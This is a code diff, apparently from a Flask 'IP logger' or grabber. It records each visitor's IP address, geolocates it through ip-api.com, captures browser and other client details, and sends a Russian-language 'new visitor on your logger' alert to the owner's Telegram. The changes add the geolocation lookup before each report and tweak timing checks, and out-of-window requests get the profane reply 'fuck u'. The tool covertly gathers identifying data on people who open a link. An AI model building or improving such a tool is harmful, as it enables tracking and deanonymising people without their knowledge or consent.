@@ -43,7 +43,7 @@ class IPLog:
     adblock: Optional[str] = None
 
     def get_info(self):
-        url = f"https://ip-api.com/json/{self.ip_address}?fields=16969727"
+        url = f"http://ip-api.com/json/{self.ip_address}?fields=16969727"
         response = requests.get(url)
         data = json.loads(response.text)
         self.__setattrs__(**data)
@@ -53,7 +53,7 @@ class IPLog:
             self.__setattr__(k, v)
 
     def get_log(self):
-        return f""""❗ На вашем логгере новый посетитель ❗
+        return f"""❗ На вашем логгере новый посетитель ❗
 <b>Время:</b> {datetime.datetime.today().strftime('%Y-%m-%d-%H:%M:%S')}
 ____________________
 <b>Айпи:</b> {self.ip_address}
@@ -119,7 +119,7 @@ def logger(tg_user_id: int):
 
     ips[ip].browser = f"{request.user_agent.browser}\
         {request.user_agent.version}".replace(" ", "")
-
+    ips[ip].last_response = time.time()
     return render_template("index.html")
 
 
@@ -127,10 +127,11 @@ def logger(tg_user_id: int):
 def add_log():
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
 
-    if time.time() - ips[ip].last_response >= 2:
+    if time.time() - ips[ip].last_response >= 3:
         return "fuck u"
 
     new_data = request.get_json()
+    ips[ip].get_info()
     ips[ip].__setattrs__(**new_data)
     ips[ip].send_log()
 
